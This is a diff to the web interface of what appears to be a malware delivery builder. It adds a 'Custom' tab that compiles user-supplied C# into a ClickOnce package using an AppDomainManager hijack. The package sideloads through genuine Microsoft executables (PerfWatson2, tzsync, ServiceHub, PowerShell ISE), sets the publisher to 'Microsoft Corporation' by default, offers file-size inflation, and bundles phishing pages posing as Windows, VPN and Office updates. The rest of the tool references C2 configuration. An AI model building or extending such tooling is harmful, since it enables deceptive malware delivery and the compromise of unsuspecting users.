@@ -388,6 +388,10 @@ input[type=range]::-webkit-slider-thumb {
       <svg viewBox="0 0 16 16" fill="currentColor"><path d="M8 1a7 7 0 100 14A7 7 0 008 1zm0 1a6 6 0 110 12A6 6 0 018 2zm-1 3v4h2V5H7zm0 5v1.5h2V10H7z"/></svg>
       <span>Bolthole</span>
     </button>
+    <button class="tab-btn" id="tab-custom" onclick="switchTab('custom')">
+      <svg viewBox="0 0 16 16" fill="currentColor"><path d="M10.478 1.647a.5.5 0 10-.956-.294l-4 13a.5.5 0 00.956.294l4-13zM4.854 4.146a.5.5 0 010 .708L1.707 8l3.147 3.146a.5.5 0 01-.708.708l-3.5-3.5a.5.5 0 010-.708l3.5-3.5a.5.5 0 01.708 0zm6.292 0a.5.5 0 000 .708L14.293 8l-3.147 3.146a.5.5 0 00.708.708l3.5-3.5a.5.5 0 000-.708l-3.5-3.5a.5.5 0 00-.708 0z"/></svg>
+      <span>Custom</span>
+    </button>
   </div>
 
   <!-- ══════════ CFCO TAB ══════════ -->
@@ -567,16 +571,6 @@ input[type=range]::-webkit-slider-thumb {
               <input type="number" id="bh-socksPort" value="1080" min="1" max="65535">
             </div>
           </div>
-          <div class="form-row">
-            <div class="form-group">
-              <label>Startup Delay (s)</label>
-              <input type="number" id="bh-startupDelay" value="5" min="0">
-            </div>
-            <div class="form-group">
-              <label>Reconnect Delay (s)</label>
-              <input type="number" id="bh-reconnectDelay" value="30" min="1">
-            </div>
-          </div>
         </div>
       </div>
 
@@ -697,6 +691,16 @@ input[type=range]::-webkit-slider-thumb {
               </div>
             </div>
           </div>
+          <div class="form-row" style="margin-top:14px">
+            <div class="form-group">
+              <label>Startup Delay (s)</label>
+              <input type="number" id="bh-startupDelay" value="5" min="0">
+            </div>
+            <div class="form-group">
+              <label>Reconnect Delay (s)</label>
+              <input type="number" id="bh-reconnectDelay" value="30" min="1">
+            </div>
+          </div>
         </div>
       </div>
 
@@ -761,6 +765,160 @@ input[type=range]::-webkit-slider-thumb {
 
     </div><!-- end bh-step2 -->
   </div><!-- end bolthole-tab -->
+
+  <!-- ══════════ CUSTOM TAB ══════════ -->
+  <div class="tab-content" id="custom-tab">
+
+    <div class="section-card open" id="cu-id-card">
+      <div class="section-header" onclick="toggleSection('cu-id-card')">
+        <div class="step-badge">1</div>
+        <span class="section-title">Application Identity</span>
+        <svg class="chevron" viewBox="0 0 16 16" fill="currentColor" width="14" height="14"><path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 01.708 0L8 10.293l5.646-5.647a.5.5 0 01.708.708l-6 6a.5.5 0 01-.708 0l-6-6a.5.5 0 010-.708z"/></svg>
+      </div>
+      <div class="section-body">
+        <div class="form-row">
+          <div class="form-group">
+            <label>Application Name</label>
+            <input type="text" id="cu-name" placeholder="MyPayload">
+          </div>
+          <div class="form-group">
+            <label>Version</label>
+            <input type="text" id="cu-version" value="1.0.0.0">
+          </div>
+        </div>
+        <div class="form-row">
+          <div class="form-group">
+            <label>Publisher Name</label>
+            <input type="text" id="cu-publisher" value="Microsoft Corporation">
+          </div>
+          <div class="form-group">
+            <label>App Description</label>
+            <input type="text" id="cu-description" placeholder="Leave blank to use app name">
+          </div>
+        </div>
+        <div class="form-group">
+          <label>Provider URL (base hosting URL — <code>clickonce/AppName.application</code> is appended automatically)</label>
+          <input type="text" id="cu-providerUrl" placeholder="https://example.com">
+        </div>
+      </div>
+    </div>
+
+    <div class="section-card open" id="cu-cs-card">
+      <div class="section-header" onclick="toggleSection('cu-cs-card')">
+        <div class="step-badge">2</div>
+        <span class="section-title">Program.cs</span>
+        <svg class="chevron" viewBox="0 0 16 16" fill="currentColor" width="14" height="14"><path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 01.708 0L8 10.293l5.646-5.647a.5.5 0 01.708.708l-6 6a.5.5 0 01-.708 0l-6-6a.5.5 0 010-.708z"/></svg>
+      </div>
+      <div class="section-body">
+        <p style="font-size:.78rem;color:var(--text2);margin-bottom:10px">
+          Upload or paste your <code style="font-family:monospace;background:var(--surface2);padding:1px 5px;border-radius:3px;color:var(--accent)">Program.cs</code>.
+          The platform compiles it and wraps it in a full ClickOnce package — AppDomainManager hijack, sideload EXE, phish page, and zip — with no further changes to your source.
+        </p>
+        <div class="form-group">
+          <label>Upload .cs file</label>
+          <label class="file-label">
+            <svg viewBox="0 0 16 16" fill="currentColor" width="16" height="16"><path d="M9.293 0H4a2 2 0 00-2 2v12a2 2 0 002 2h8a2 2 0 002-2V4.707A1 1 0 0013.707 4L10 .293A1 1 0 009.293 0zM9.5 3.5v-2l3 3h-2a1 1 0 01-1-1z"/></svg>
+            <span class="file-name" id="cuCsFileName">No file chosen &mdash; or paste source below</span>
+            <input type="file" id="cuCsFile" accept=".cs,.txt">
+          </label>
+        </div>
+        <div class="form-group">
+          <label>Source code</label>
+          <textarea id="cu-programCs" rows="16" spellcheck="false"
+            style="font-family:monospace;font-size:.8rem;resize:vertical;background:var(--surface2);border:1px solid var(--border);border-radius:6px;padding:10px;color:var(--text1);width:100%;box-sizing:border-box"
+            placeholder="using System;&#10;&#10;namespace MyPayload&#10;{&#10;    public class MyAppDomainManager : AppDomainManager&#10;    {&#10;        public override void InitializeNewDomain(AppDomainSetup appDomainInfo)&#10;        {&#10;            // your code here&#10;        }&#10;    }&#10;}"></textarea>
+        </div>
+      </div>
+    </div>
+
+    <div class="section-card open" id="cu-payload-card">
+      <div class="section-header" onclick="toggleSection('cu-payload-card')">
+        <div class="step-badge">3</div>
+        <span class="section-title">Payload Configuration</span>
+        <svg class="chevron" viewBox="0 0 16 16" fill="currentColor" width="14" height="14"><path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 01.708 0L8 10.293l5.646-5.647a.5.5 0 01.708.708l-6 6a.5.5 0 01-.708 0l-6-6a.5.5 0 010-.708z"/></svg>
+      </div>
+      <div class="section-body">
+        <div class="form-group">
+          <label>Sideload Target</label>
+          <div class="sideload-grid" id="cu-sideload-grid">
+            <label class="sideload-card selected" onclick="selectSideload(this,'cu')">
+              <input type="radio" name="cu-sideload" value="perfwatson2" checked>
+              <div class="sideload-card-icon">&#128202;</div>
+              <div class="sideload-card-text"><div class="name">PerfWatson2</div><div class="exe">PerfWatson2.exe</div></div>
+            </label>
+            <label class="sideload-card" onclick="selectSideload(this,'cu')">
+              <input type="radio" name="cu-sideload" value="tzsync">
+              <div class="sideload-card-icon">&#128336;</div>
+              <div class="sideload-card-text"><div class="name">TzSync</div><div class="exe">tzsync.exe</div></div>
+            </label>
+            <label class="sideload-card" onclick="selectSideload(this,'cu')">
+              <input type="radio" name="cu-sideload" value="systemhost">
+              <div class="sideload-card-icon">&#9881;</div>
+              <div class="sideload-card-text"><div class="name">ServiceHub Host</div><div class="exe">ServiceHub.Host.netfx.x64.exe</div></div>
+            </label>
+            <label class="sideload-card" onclick="selectSideload(this,'cu')">
+              <input type="radio" name="cu-sideload" value="powershell">
+              <div class="sideload-card-icon">&#128309;</div>
+              <div class="sideload-card-text"><div class="name">PowerShell ISE</div><div class="exe">powershell_ise.exe</div></div>
+            </label>
+          </div>
+        </div>
+        <div class="form-row" style="margin-top:14px">
+          <div class="form-group">
+            <label>Inflate Size</label>
+            <div class="slider-wrap">
+              <input type="range" id="cu-inflateSlider" min="0" max="500" value="0"
+                oninput="document.getElementById('cu-inflateVal').textContent=this.value+' MB'">
+              <span class="slider-val" id="cu-inflateVal">0 MB</span>
+            </div>
+          </div>
+          <div class="form-group">
+            <label>Custom Icon (.ico) &mdash; optional</label>
+            <label class="file-label">
+              <svg viewBox="0 0 16 16" fill="currentColor" width="16" height="16"><path d="M9.293 0H4a2 2 0 00-2 2v12a2 2 0 002 2h8a2 2 0 002-2V4.707A1 1 0 0013.707 4L10 .293A1 1 0 009.293 0zM9.5 3.5v-2l3 3h-2a1 1 0 01-1-1z"/></svg>
+              <span class="file-name" id="cuIconFileName">No file chosen &mdash; defaults to template icon</span>
+              <input type="file" id="cuIconFile" accept=".ico">
+            </label>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="section-card open" id="cu-phish-card">
+      <div class="section-header" onclick="toggleSection('cu-phish-card')">
+        <div class="step-badge">4</div>
+        <span class="section-title">Phishing Page Template</span>
+        <svg class="chevron" viewBox="0 0 16 16" fill="currentColor" width="14" height="14"><path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 01.708 0L8 10.293l5.646-5.647a.5.5 0 01.708.708l-6 6a.5.5 0 01-.708 0l-6-6a.5.5 0 010-.708z"/></svg>
+      </div>
+      <div class="section-body">
+        <div class="phish-select-row">
+          <select id="cu-phishTemplate" onchange="onCuPhishTemplateChange()">
+            <option value="it_portal">IT Portal (Mandatory Update)</option>
+            <option value="microsoft_update">Windows Update (KB Security Patch)</option>
+            <option value="vpn_update">VPN Client Update</option>
+            <option value="office_update">Microsoft 365 / Office Update</option>
+          </select>
+          <button class="btn btn-ghost btn-sm" onclick="toggleCuPhishPreview()">&#128065; Preview</button>
+        </div>
+        <div class="phish-preview-wrap" id="cuPhishPreviewWrap">
+          <div class="phish-preview-bar">
+            <span id="cuPhishPreviewLabel">Preview</span>
+            <button class="btn btn-ghost btn-sm" onclick="toggleCuPhishPreview()" style="padding:3px 10px;font-size:.72rem">Close</button>
+          </div>
+          <iframe id="cuPhishPreviewFrame" sandbox="allow-same-origin" title="Phish page preview"></iframe>
+        </div>
+        <p style="font-size:.78rem;color:var(--text2);margin-top:12px">
+          The selected page is included as <code style="font-family:monospace;background:var(--surface2);padding:1px 5px;border-radius:3px;color:var(--accent)">index.html</code> at the zip root.
+        </p>
+      </div>
+    </div>
+
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-top:4px;flex-wrap:wrap;gap:10px">
+      <div class="error-banner" id="cuError"></div>
+      <button class="btn btn-primary" id="cu-submitBtn" onclick="submitCustom()">&#9881; Build Custom Payload</button>
+    </div>
+
+  </div><!-- end custom-tab -->
 
   <!-- ══════════ HISTORY TAB ══════════ -->
   <div class="tab-content" id="history-tab">
@@ -827,8 +985,9 @@ let actionCounter = 0;
 let _logPollTimer = null;
 let _currentBuildId = null;
 let _historyRefreshTimer = null;
-let _cfcoIconB64 = '';
-let _bhIconB64   = '';
+let _cfcoIconB64   = '';
+let _bhIconB64     = '';
+let _customIconB64 = '';
 let _bhPublicKey = '';
 let _phishCache  = {};
 let _phishPreviewVisible = false;
@@ -855,17 +1014,27 @@ function randomName() {
 window.addEventListener('DOMContentLoaded', () => {
   document.getElementById('nameInput').value = randomName();
   document.getElementById('bh-name').value   = randomName();
+  document.getElementById('cu-name').value   = randomName();
   loadBhC2Config();
-  wireIconPicker('iconFile',   'iconFileName',   v => { _cfcoIconB64 = v; });
-  wireIconPicker('bhIconFile', 'bhIconFileName', v => { _bhIconB64   = v; });
+  wireIconPicker('iconFile',   'iconFileName',   v => { _cfcoIconB64   = v; });
+  wireIconPicker('bhIconFile', 'bhIconFileName', v => { _bhIconB64     = v; });
+  wireIconPicker('cuIconFile', 'cuIconFileName', v => { _customIconB64 = v; });
+  document.getElementById('cuCsFile').addEventListener('change', function() {
+    const file = this.files[0];
+    if (!file) return;
+    document.getElementById('cuCsFileName').textContent = file.name;
+    const fr = new FileReader();
+    fr.onload = e => { document.getElementById('cu-programCs').value = e.target.result; };
+    fr.readAsText(file);
+  });
 });
 
 // ── Tabs ───────────────────────────────────────────────────────────────────
 function switchTab(tab) {
-  ['cfco','bolthole','history'].forEach(t => {
+  ['cfco','bolthole','custom','history'].forEach(t => {
     document.getElementById(t+'-tab').classList.toggle('active', t===tab);
   });
-  ['cfco','bolthole'].forEach(t => {
+  ['cfco','bolthole','custom'].forEach(t => {
     document.getElementById('tab-'+t).classList.toggle('active', t===tab);
   });
   if (tab === 'history') loadHistory();
@@ -1450,6 +1619,76 @@ async function submitBolthole() {
 
 function showBhError(msg) { const el=document.getElementById('bhError'); el.textContent=msg; el.classList.add('visible'); }
 function hideBhError()    { document.getElementById('bhError').classList.remove('visible'); }
+
+// ── Custom tab helpers ─────────────────────────────────────────────────────
+function onCuPhishTemplateChange() {
+  const wrap = document.getElementById('cuPhishPreviewWrap');
+  if (wrap.style.display !== 'none' && wrap.style.display !== '') {
+    const name = document.getElementById('cu-phishTemplate').value;
+    document.getElementById('cuPhishPreviewFrame').src = '/api/phish-template/' + name;
+    document.getElementById('cuPhishPreviewLabel').textContent = 'Preview — ' + name;
+  }
+}
+
+function toggleCuPhishPreview() {
+  const wrap = document.getElementById('cuPhishPreviewWrap');
+  const visible = wrap.style.display === 'block';
+  if (!visible) {
+    const name = document.getElementById('cu-phishTemplate').value;
+    document.getElementById('cuPhishPreviewFrame').src = '/api/phish-template/' + name;
+    document.getElementById('cuPhishPreviewLabel').textContent = 'Preview — ' + name;
+  }
+  wrap.style.display = visible ? 'none' : 'block';
+}
+
+async function submitCustom() {
+  const name = document.getElementById('cu-name').value.trim();
+  const src  = document.getElementById('cu-programCs').value.trim();
+  if (!name) return showCuError('Application name is required.');
+  if (!/^[a-zA-Z_][a-zA-Z0-9_]*$/.test(name)) return showCuError('Name must match ^[a-zA-Z_][a-zA-Z0-9_]*$');
+  if (!src)  return showCuError('Program.cs source is required — upload a file or paste source.');
+  hideCuError();
+  document.getElementById('cu-submitBtn').disabled = true;
+
+  const program_cs_b64 = btoa(unescape(encodeURIComponent(src)));
+
+  const body = {
+    name,
+    version:        document.getElementById('cu-version').value || '1.0.0.0',
+    publisher:      document.getElementById('cu-publisher').value || 'Microsoft Corporation',
+    description:    document.getElementById('cu-description').value || '',
+    provider_url:   document.getElementById('cu-providerUrl').value || '',
+    sideload:       document.querySelector('input[name="cu-sideload"]:checked')?.value || 'perfwatson2',
+    inflate:        parseInt(document.getElementById('cu-inflateSlider').value) || 0,
+    phish_template: document.getElementById('cu-phishTemplate').value,
+    program_cs_b64,
+    icon:           _customIconB64,
+  };
+
+  try {
+    const r = await fetch('/api/custom-build', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(body) });
+    if (!r.ok) throw new Error(await r.text());
+    const { buildid } = await r.json();
+    _currentBuildId = buildid;
+    showReopenButtons();
+    document.getElementById('cu-submitBtn').disabled = false;
+    openLogModal(buildid);
+    watchForCompletion(buildid, () => {
+      const base = window.location.origin + '/build/' + buildid + '/';
+      if (_resultsShown) return;
+      showResultsInModal([
+        { url: base + name + '.zip', label: '&#8659; ' + name + '.zip', dl: true },
+        { url: base, label: '&#128193; Browse Build Dir', blank: true },
+      ]);
+    });
+  } catch(e) {
+    showCuError('Build request failed: ' + e.message);
+    document.getElementById('cu-submitBtn').disabled = false;
+  }
+}
+
+function showCuError(msg) { const el=document.getElementById('cuError'); el.textContent=msg; el.classList.add('visible'); }
+function hideCuError()    { document.getElementById('cuError').classList.remove('visible'); }
 
 // ── Build history ──────────────────────────────────────────────────────────
 async function loadHistory() {
